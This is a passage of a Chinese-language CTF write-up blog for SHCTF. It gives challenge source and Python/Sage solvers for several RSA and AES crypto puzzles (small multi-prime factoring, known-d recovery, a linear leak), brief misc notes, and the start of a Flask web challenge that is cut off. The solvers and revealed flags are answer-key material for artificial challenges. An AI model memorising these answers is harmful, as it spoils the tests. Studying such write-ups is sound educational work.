class="string">b&#x27;\xd0\xe2d\xe5T\xf9\xd2\xc8U0\xfb\xc8\xcd]b\xf8\x85\xc8\xbe\xa4\xcc3c\x99[\xbd\t(f\x10\xb5D&gt;\xe0\xde\x05\x16\x0b\xdc\x92\xd3\xb0\x1f-PN\xa8P&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;QWO\xa0\xe8tIvH\xbf\xed\x82~P\xac\xb4&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\x10:\x0f~\x1bWl\xad\x7f\xf7\xb8\x91\x8f$\xd6\xeb&#x27;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(c).decode())</span><br></pre></td></tr></table></figure><h3 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prod</span>(<span class="params">iterable</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> iterable:</span><br><span class="line">        result *= num</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">prime_list = [getPrime(<span class="number">64</span>) <span class="keyword">for</span> _ <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">10</span>) ]</span><br><span class="line">N = prod(prime_list)</span><br><span class="line">p_list = random.sample(prime_list,<span class="number">7</span>)</span><br><span class="line">n = prod(p_list)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>yafu</code>分解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">c = <span class="number">982057246005841122681719726162449275140402636679137501643344871376145083063016298600959370629453243515753285445832736433034476775497</span></span><br><span class="line">N = <span class="number">111727941450518685645880500356518853696393581139199683397655873524434398483719707355658359575956205560295208672611108319343069181170539103809784492328225885104488345034732063873819178228473087</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">prime_list = [<span class="number">9750009592369937929</span>, <span class="number">17631783225707169887</span>, <span class="number">14897435311328090363</span>, <span class="number">12219342310321289621</span>, <span class="number">12027757975747737973</span>,</span><br><span class="line">              <span class="number">15158171038546021043</span>, <span class="number">16488560220293550973</span>, <span class="number">10283692020046850117</span>, <span class="number">11073201121963691101</span>, <span class="number">10429529301865387397</span>]</span><br><span class="line">p_all_list = <span class="built_in">list</span>(itertools.permutations(prime_list, <span class="number">7</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p_all_list:</span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> i:</span><br><span class="line">        phi *= p-<span class="number">1</span></span><br><span class="line">        n *= p</span><br><span class="line">    <span class="keyword">if</span> GCD(e, phi) == <span class="number">1</span>:</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;SHCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="d_known"><a class="markdownIt-Anchor" href="#d_known"></a> d_known</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 5128269945205941681657162690752124645147095603307776642558620464753149474351813432516302175895967604322423895428085228263377444072843608756088456978614813713707998220343468702704788501256758288635169563164297803428146056603182717915240126485071421659045280467383314498992918502931984546850909367496851620848827787411420736564351902392039206384433279115493991042882911016903299425217764902721104855561290614026117785416484916861798527602885421517301667939650766352244742052165224414400947997222256406536694670357685537325088273890185902387069072204887202971094744552181245341549936791944865465378905842980222407851742</span></span><br><span class="line"><span class="string">d = 3790271832736808378164485821342007847088299208140809668714802444291303279665930976642897262924930591631798761435880895708714697550489226406467924717484448076572088547295409148608378512478441170191291934724323097031903250264336964541317492561494853799000315044170684567389237337841599036163417916443756372926924022073020766718666542437634977043398727757614795102093582095109387147251701718216785864028290558113041981262382167416454071080366899471219871742443782268440377640255755782371837790956244466349724371425724180875521438840621722917440786455543247168529379012719810694051987668057392173716950629707189238453793</span></span><br><span class="line"><span class="string">e = 0x10001</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>打印发现<code>d.bit_length()=2045</code>，跟n差不多大了，我们又知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d-1=k\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>≈</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\phi(n)\approx n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，所以k在[1,e]之间，对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>开平方会得到一个大于p的数，那么我们找小于它的附近的一个素数即可，q就是这个素数的下一个</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">5128269945205941681657162690752124645147095603307776642558620464753149474351813432516302175895967604322423895428085228263377444072843608756088456978614813713707998220343468702704788501256758288635169563164297803428146056603182717915240126485071421659045280467383314498992918502931984546850909367496851620848827787411420736564351902392039206384433279115493991042882911016903299425217764902721104855561290614026117785416484916861798527602885421517301667939650766352244742052165224414400947997222256406536694670357685537325088273890185902387069072204887202971094744552181245341549936791944865465378905842980222407851742</span></span><br><span class="line">d = <span class="number">3790271832736808378164485821342007847088299208140809668714802444291303279665930976642897262924930591631798761435880895708714697550489226406467924717484448076572088547295409148608378512478441170191291934724323097031903250264336964541317492561494853799000315044170684567389237337841599036163417916443756372926924022073020766718666542437634977043398727757614795102093582095109387147251701718216785864028290558113041981262382167416454071080366899471219871742443782268440377640255755782371837790956244466349724371425724180875521438840621722917440786455543247168529379012719810694051987668057392173716950629707189238453793</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(d.bit_length())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (e*d-<span class="number">1</span>) % i != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e*d-<span class="number">1</span>)//i</span><br><span class="line">    p = gmpy2.iroot(phi, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    p = prevprime(p)</span><br><span class="line">    q = nextprime(p)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)*(q-<span class="number">1</span>) == phi:</span><br><span class="line">        n = p*q</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="baby_mod"><a class="markdownIt-Anchor" href="#baby_mod"></a> baby_mod</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">777</span>)</span><br><span class="line">t = getPrime(<span class="number">777</span>)</span><br><span class="line">tmp = getPrime(<span class="number">15</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;<span class="built_in">pow</span>(m,e,n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak = <span class="subst">&#123;p*r-q*t-tmp&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;t = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 25900013611745459234449421352128550791380405075852427844520047672976045705053669812761027512471099887955926922807763156068475467691843960238860198209869207050769506000272083846340089993442226307892271915673319497925726165266677353649105096919576206677557645681229463591571683344132256764727867218414475821414</span></span><br><span class="line"><span class="string">leak = 1315576698569519021825869605558080173961766113174117516895155642458801441613594247202719705730125235122134470528523180642252331178634029317505467190118181724443647215388521217342902429209926124347180537512385923020087294072947165058918179896904165121851416283369980345261683209548370901441893420488465961879888423704643272728339367303995737167427397015998668341503217114591217674582342979</span></span><br><span class="line"><span class="string">r = 449509105386333182769495605541266433612190248649889527500668938725282197092696225044504839710548395681491923335485736430311542544811714539401973591141967042310944552061762227459161233997399455785984753772614529066263632633766099414193</span></span><br><span class="line"><span class="string">t = 466570739651607385339907801250236144323523615960304899132337822754876522678249651820805564899362256608057888046522867494446053404906721052232912923778440295889959052577191557765649038942151814731893947704867634072305897918671425093691</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>参考<a href="https://dexterjie.github.io/2024/08/06/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/SRCTF/#Baby">https://dexterjie.github.io/2024/08/06/赛题复现/SRCTF/#Baby</a><br />小改一下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">Ge = Matrix(ZZ,[</span><br><span class="line">    [leak,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [r,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [-t,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">500</span>]</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>当时给新生赛出题，找点资料，突然翻到了<code>Lst4r</code>师傅的一篇<code>wp</code>，发现这东西原来是<code>丢番图方程</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>r</mi><mo>−</mo><mi>q</mi><mi>t</mi><mo>=</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>t</mi><mi>e</mi><mi>m</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">pr-qt=leak+temp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">ax+by=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>形式一致，只要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi><mi mathvariant="normal">∣</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">GCD(a,b)=d|c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord">∣</span><span class="mord mathnormal">c</span></span></span></span>，则方程有解，这好像跟解同余方程有一点的联系啊，然后推导过程，其实这里就是GCD(a,b)=1，才有了后面的东西<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>−</mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">ax-by=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>≡</mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax\equiv c(mod\ b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mi>c</mi><mo>∗</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=c*a^{-1}(mod\ b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo>−</mo><mi>c</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">y=(ax-c)//b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span><br />说实话，格版本的还不能很能看懂目前</p><p>然后又去看了同余方程，以为二者互通解法，其实只要<code>ab</code>互素包直接出的，但我在<code>XSCTF</code>出的那题同余方程是不互素的，所以逆元不存在，然后出题不小心选的是互素的，这下改小小，就还回来我同余方程的预期解法了，差点要非预期(最后貌似打的都是非预期，整除一下又能直接打了)</p><p>总结就是，互素都是直接出，二者没有本质区别；不互素，同余方程求解还是得靠<code>egcd</code>，毕竟二者还是同一个东西吧，所以都还是<code>egcd</code><br />本道题运用的其实就<strong>取模和整除</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">25900013611745459234449421352128550791380405075852427844520047672976045705053669812761027512471099887955926922807763156068475467691843960238860198209869207050769506000272083846340089993442226307892271915673319497925726165266677353649105096919576206677557645681229463591571683344132256764727867218414475821414</span></span><br><span class="line">leak = <span class="number">1315576698569519021825869605558080173961766113174117516895155642458801441613594247202719705730125235122134470528523180642252331178634029317505467190118181724443647215388521217342902429209926124347180537512385923020087294072947165058918179896904165121851416283369980345261683209548370901441893420488465961879888423704643272728339367303995737167427397015998668341503217114591217674582342979</span></span><br><span class="line">r = <span class="number">449509105386333182769495605541266433612190248649889527500668938725282197092696225044504839710548395681491923335485736430311542544811714539401973591141967042310944552061762227459161233997399455785984753772614529066263632633766099414193</span></span><br><span class="line">t = <span class="number">466570739651607385339907801250236144323523615960304899132337822754876522678249651820805564899362256608057888046522867494446053404906721052232912923778440295889959052577191557765649038942151814731893947704867634072305897918671425093691</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">14</span>, <span class="number">2</span>**<span class="number">15</span>)):</span><br><span class="line">    p = (leak+i)*inverse(r, t) % t</span><br><span class="line">    q = (r*p-(leak+i))//t</span><br><span class="line">    <span class="keyword">if</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        n = p*q</span><br><span class="line">        <span class="keyword">if</span> GCD(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))==<span class="number">1</span>:</span><br><span class="line">            d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;SHCTF&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;q = &#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment"># p = 10828571852464331341712150217058916119291334034775990469361200035678740509774480669454106468384506195444300931477689490439063149020461676127989241184154737</span></span><br><span class="line"><span class="comment"># q = 7612918354236349590305500410457447666517294016150410935511115244808748864036428494251452016172971676206380973588984417215894793791556907054138118188367171</span></span><br><span class="line"><span class="comment"># b&#x27;SHCTF&#123;39066b49-7c3f-47a3-a7d7-546c11048817&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 64%</span></span><br></pre></td></tr></table></figure><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2><h3 id="签到题"><a class="markdownIt-Anchor" href="#签到题"></a> 签到题</h3><p><code>SHCTF我又踏马来辣！</code>，延续去年传统</p><h3 id="拜师之旅1"><a class="markdownIt-Anchor" href="#拜师之旅1"></a> 拜师之旅①</h3><p><code>png</code>头尾缺失补齐，crc校验，宽高不对<code>python Deformed-Image-Restorer.py -i roxy.png</code></p><h3 id="真真假假遮遮掩掩"><a class="markdownIt-Anchor" href="#真真假假遮遮掩掩"></a> 真真假假?遮遮掩掩!</h3><p>一开始还以为是伪加密，一看又是山河经典的掩码<code>SHCTF??????FTCHS</code></p><h3 id="rasterizing-traffic"><a class="markdownIt-Anchor" href="#rasterizing-traffic"></a> Rasterizing Traffic()</h3><p>有<code>fake flag</code>，流量包有图片<code>grating.png</code>，导出保存<br /><img src="https://picx.zhimg.com/80/v2-a874991b942575ee60299a796ccf2d4a_1440w.png" alt="" /><br />光栅图片，没找到工具解……</p><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id="guess_the_number"><a class="markdownIt-Anchor" href="#guess_the_number"></a> guess_the_number</h3><p><code>/s0urce</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, first_num = first_num)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s0urce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/first&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_first_number</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(first_num)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_seed</span>():</span><br><span class="line">    num = request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="built_in">str</span>(second_num):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span 